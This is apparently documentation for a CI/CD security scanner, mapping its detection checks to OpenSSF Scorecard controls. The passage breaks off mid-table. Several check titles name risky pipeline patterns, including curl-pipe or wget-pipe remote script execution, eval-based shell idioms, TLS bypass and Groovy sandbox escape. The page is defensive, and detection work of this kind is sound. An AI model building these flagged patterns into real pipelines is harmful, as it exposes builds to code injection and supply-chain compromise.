# OpenSSF Scorecard

- **Version:** 5
- **URL:** <https://github.com/ossf/scorecard/blob/main/docs/checks.md>
- **Source of truth:** `pipeline_check/core/standards/data/openssf_scorecard.py`

OpenSSF Scorecard is the open-source project health framework.
Pinned-deps, branch-protection, signing, dangerous workflows. The
scanner's checks evidence the workflow side; pair with the
[SCM posture provider](../providers/scm.md) for the repo-settings
side that Scorecard also covers.

## At a glance

- **Controls in this standard:** 10
- **Controls evidenced by at least one check:** 10 / 10
- **Distinct checks evidencing this standard:** 303
- **Of those, autofixable with `--fix`:** 71

_Severity levels (`CRITICAL` / `HIGH` / `MEDIUM` / `LOW` / `INFO`) follow the same scale across every provider and standard. See [How to read severity](README.md#how-to-read-severity) on the standards overview for the definitions._

## Coverage by control

Click a control ID to jump to the per-control section with the full check list. The severity mix column shows the spread of evidencing checks by severity (`C`ritical / `H`igh / `M`edium / `L`ow / `I`nfo).

| Control | Title | Checks | Severity mix |
|---------|-------|-------:|--------------|
| [`Branch-Protection`](#ctrl-branch-protection) | Default branch is protected against force-push, deletion, and direct push without review | 20 | 7H · 7M · 6L |
| [`Code-Review`](#ctrl-code-review) | Changes merged to the default branch require review | 27 | 9H · 17M · 1L |
| [`Dangerous-Workflow`](#ctrl-dangerous-workflow) | No dangerous patterns in CI workflows (untrusted checkout, script injection) | 76 | 17C · 50H · 8M · 1L |
| [`Dependency-Update-Tool`](#ctrl-dependency-update-tool) | Project uses an automated dependency-update tool (Dependabot / Renovate) | 7 | 7M |
| [`Pinned-Dependencies`](#ctrl-pinned-dependencies) | Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources | 70 | 1C · 42H · 23M · 4L |
| [`SAST`](#ctrl-sast) | Project uses static analysis / vulnerability scanning | 14 | 1H · 12M · 1L |
| [`SBOM`](#ctrl-sbom) | Releases publish a software bill of materials | 15 | 1H · 13M · 1L |
| [`Signed-Releases`](#ctrl-signed-releases) | Release artifacts are cryptographically signed | 26 | 3H · 23M |
| [`Token-Permissions`](#ctrl-token-permissions) | CI tokens are scoped to the minimum required permissions | 60 | 21C · 23H · 16M |
| [`Vulnerabilities`](#ctrl-vulnerabilities) | Project scans for and resolves known vulnerabilities | 13 | 1H · 12M |

## Filter at runtime

Restrict a scan to checks that evidence this standard with `--standard openssf_scorecard`:

```bash
# All providers, only checks tied to this standard
pipeline_check --standard openssf_scorecard

# Compose with --pipeline to scope by provider
pipeline_check --pipeline github --standard openssf_scorecard

# Compose with another standard to widen the lens
pipeline_check --pipeline aws --standard openssf_scorecard --standard owasp_cicd_top_10
```

## Controls in scope

### Branch-Protection: Default branch is protected against force-push, deletion, and direct push without review { #ctrl-branch-protection }

**Evidenced by 20 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-001`](#detail-scm-001) | Default branch has no protection rule | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-002`](#detail-scm-002) | Default branch protection does not require pull request reviews | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-006`](#detail-scm-006) | Default branch protection does not require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-007`](#detail-scm-007) | Default branch protection allows force-pushes | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-008`](#detail-scm-008) | Default branch protection does not require status checks | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-009`](#detail-scm-009) | Default branch protection allows branch deletion | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-010`](#detail-scm-010) | Branch protection allows administrators to bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-024`](#detail-scm-024) | Deployment environment can deploy from any branch | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-029`](#detail-scm-029) | Repository ruleset is in evaluate / disabled mode (not enforced) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-030`](#detail-scm-030) | Repository ruleset has bypass actor with bypass_mode: always | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-032`](#detail-scm-032) | Active ruleset doesn't require a PR review (governance theater) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-033`](#detail-scm-033) | Active ruleset doesn't require status checks | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-034`](#detail-scm-034) | Active ruleset doesn't block force-push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-035`](#detail-scm-035) | Active ruleset doesn't block branch deletion | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-036`](#detail-scm-036) | Active ruleset doesn't require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-038`](#detail-scm-038) | Active ruleset doesn't require linear history | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-039`](#detail-scm-039) | Active ruleset doesn't pin a required workflow | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-040`](#detail-scm-040) | Active ruleset doesn't gate on code scanning results | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-041`](#detail-scm-041) | Active ruleset doesn't gate on a deployment environment | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-042`](#detail-scm-042) | Active ruleset doesn't require merge queue | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### Code-Review: Changes merged to the default branch require review { #ctrl-code-review }

**Evidenced by 27 checks** across 9 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, GitHub Actions, GitLab CI, Jenkins, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-004`](#detail-ado-004) | Deployment job missing environment binding | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-004`](#detail-bb-004) | Deploy step missing `deployment:` environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-007`](#detail-bk-007) | Deploy step not gated by a manual block / input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-008`](#detail-cb-008) | CodeBuild buildspec is inline (not sourced from a protected repo) | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CC-009`](#detail-cc-009) | Deploy job missing manual approval gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CCM-001`](#detail-ccm-001) | CodeCommit repository has no approval rule template attached | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CD-002`](#detail-cd-002) | AllAtOnce deployment config, no canary or rolling strategy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CP-001`](#detail-cp-001) | No approval action before deploy stages | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CP-005`](#detail-cp-005) | Production Deploy stage has no preceding ManualApproval | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GHA-014`](#detail-gha-014) | Deploy job missing environment binding | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-004`](#detail-gl-004) | Deploy job lacks manual approval or environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-029`](#detail-gl-029) | Manual deploy job defaults to allow_failure: true | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-005`](#detail-jf-005) | Deploy stage missing manual `input` approval | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-024`](#detail-jf-024) | `input` approval step missing submitter restriction | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-026`](#detail-jf-026) | `build job:` trigger ignores downstream failure | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`SCM-002`](#detail-scm-002) | Default branch protection does not require pull request reviews | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-011`](#detail-scm-011) | Default branch protection does not require CODEOWNERS reviews | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-012`](#detail-scm-012) | Default branch protection keeps stale reviews after a push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-013`](#detail-scm-013) | Default branch protection does not require conversation resolution | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-014`](#detail-scm-014) | Default branch protection does not require approval of the most recent push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-017`](#detail-scm-017) | Repository has no CODEOWNERS file | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-021`](#detail-scm-021) | Actions can approve pull requests (self-approval bypass) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-023`](#detail-scm-023) | Deployment environment lacks required-reviewer protection | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-027`](#detail-scm-027) | Outside collaborator holds write / maintain / admin access | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-031`](#detail-scm-031) | Repo allows auto-merge (no human-timing gate) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-032`](#detail-scm-032) | Active ruleset doesn't require a PR review (governance theater) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-037`](#detail-scm-037) | Active ruleset's pull_request rule doesn't dismiss stale reviews | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### Dangerous-Workflow: No dangerous patterns in CI workflows (untrusted checkout, script injection) { #ctrl-dangerous-workflow }

**Evidenced by 76 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-002`](#detail-ado-002) | Script injection via attacker-controllable context | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-011`](#detail-ado-011) | `template: <local-path>` on PR-validated pipeline | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-012`](#detail-ado-012) | Cache@2 key derives from $(System.PullRequest.*) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-016`](#detail-ado-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-019`](#detail-ado-019) | `extends:` template on PR-validated pipeline points to local path | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-023`](#detail-ado-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-026`](#detail-ado-026) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-027`](#detail-ado-027) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-002`](#detail-argo-002) | Argo template container runs privileged or as root | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-004`](#detail-argo-004) | Argo workflow mounts hostPath or shares host namespaces | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-005`](#detail-argo-005) | Argo input parameter interpolated unsafely in script / args | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-008`](#detail-argo-008) | Argo script source pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-002`](#detail-bb-002) | Script injection via attacker-controllable context | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-012`](#detail-bb-012) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-018`](#detail-bb-018) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-023`](#detail-bb-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-025`](#detail-bb-025) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-026`](#detail-bb-026) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-003`](#detail-bk-003) | Untrusted Buildkite variable interpolated in command | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-004`](#detail-bk-004) | Remote script piped into shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-005`](#detail-bk-005) | Container started with --privileged or host-bind escalation | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-015`](#detail-bk-015) | agents map interpolates attacker-controllable Buildkite variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-010`](#detail-cb-010) | CodeBuild webhook allows fork-PR builds without actor filtering | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CB-011`](#detail-cb-011) | CodeBuild buildspec contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`CC-002`](#detail-cc-002) | Script injection via untrusted environment variable | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-012`](#detail-cc-012) | Dynamic config via `setup: true` enables code injection | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-013`](#detail-cc-013) | Deploy job in workflow has no branch filter | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-016`](#detail-cc-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-023`](#detail-cc-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-025`](#detail-cc-025) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-026`](#detail-cc-026) | Config contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-027`](#detail-cc-027) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CP-003`](#detail-cp-003) | Source stage using polling instead of event-driven trigger | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`CP-007`](#detail-cp-007) | CodePipeline v2 PR trigger accepts all branches | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`DF-004`](#detail-df-004) | RUN executes a remote script via curl-pipe / wget-pipe | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-005`](#detail-df-005) | RUN uses shell-eval (eval / sh -c on a variable / backticks) | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DR-002`](#detail-dr-002) | Step runs with privileged: true | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-003`](#detail-dr-003) | Untrusted Drone template variable in shell command | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-006`](#detail-dr-006) | TLS verification disabled in step commands | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-007`](#detail-dr-007) | Step mounts a sensitive host path | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-009`](#detail-dr-009) | Cache plugin key embeds an attacker-controllable Drone variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-011`](#detail-dr-011) | node map interpolates attacker-controllable Drone variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`GCB-004`](#detail-gcb-004) | dynamicSubstitutions on with user substitutions in step args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-006`](#detail-gcb-006) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-002`](#detail-gha-002) | pull_request_target checks out PR head | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-003`](#detail-gha-003) | Script injection via untrusted context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-009`](#detail-gha-009) | workflow_run downloads upstream artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-010`](#detail-gha-010) | Local action (./path) on untrusted-trigger workflow | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-011`](#detail-gha-011) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-013`](#detail-gha-013) | issue_comment trigger without author guard | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-016`](#detail-gha-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-023`](#detail-gha-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-026`](#detail-gha-026) | Container job disables isolation via `options:` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-027`](#detail-gha-027) | Workflow contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-028`](#detail-gha-028) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-038`](#detail-gha-038) | Workflow re-enables retired ::set-env / ::add-path commands | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-002`](#detail-gl-002) | Script injection via untrusted commit/MR context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-011`](#detail-gl-011) | include: local file pulled in MR-triggered pipeline | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-012`](#detail-gl-012) | Cache key derives from MR-controlled CI variable | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-016`](#detail-gl-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-023`](#detail-gl-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-025`](#detail-gl-025) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-026`](#detail-gl-026) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-033`](#detail-gl-033) | Global before_script / after_script propagates taint to every job | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-002`](#detail-jf-002) | Script step interpolates attacker-controllable env var | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-012`](#detail-jf-012) | `load` step pulls Groovy from disk without integrity pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-013`](#detail-jf-013) | copyArtifacts ingests another job's output unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-016`](#detail-jf-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-019`](#detail-jf-019) | Groovy sandbox escape pattern detected | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-023`](#detail-jf-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-029`](#detail-jf-029) | Jenkinsfile contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-030`](#detail-jf-030) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`TKN-002`](#detail-tkn-002) | Tekton step runs privileged or as root | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-003`](#detail-tkn-003) | Tekton param interpolated unsafely in step script | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-004`](#detail-tkn-004) | Tekton Task mounts hostPath or shares host namespaces | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-008`](#detail-tkn-008) | Tekton step script pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |

### Dependency-Update-Tool: Project uses an automated dependency-update tool (Dependabot / Renovate) { #ctrl-dependency-update-tool }

**Evidenced by 7 checks** across 7 providers (Azure DevOps, Bitbucket, CircleCI, GitHub Actions, GitLab CI, Jenkins, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-022`](#detail-ado-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-022`](#detail-bb-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-022`](#detail-cc-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-022`](#detail-gha-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-022`](#detail-gl-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-022`](#detail-jf-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`SCM-005`](#detail-scm-005) | Dependabot security updates are not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### Pinned-Dependencies: Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources { #ctrl-pinned-dependencies }

**Evidenced by 70 checks** across 16 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, OCI manifest, SCM, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-001`](#detail-ado-001) | Task reference not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-005`](#detail-ado-005) | Container image not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-009`](#detail-ado-009) | Container image pinned by tag rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-018`](#detail-ado-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-021`](#detail-ado-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-025`](#detail-ado-025) | Cross-repo template not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-028`](#detail-ado-028) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-001`](#detail-argo-001) | Argo template container image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-008`](#detail-argo-008) | Argo script source pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ARGO-014`](#detail-argo-014) | Argo template script runs unpinned package install | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-001`](#detail-bb-001) | pipe: action not pinned to exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
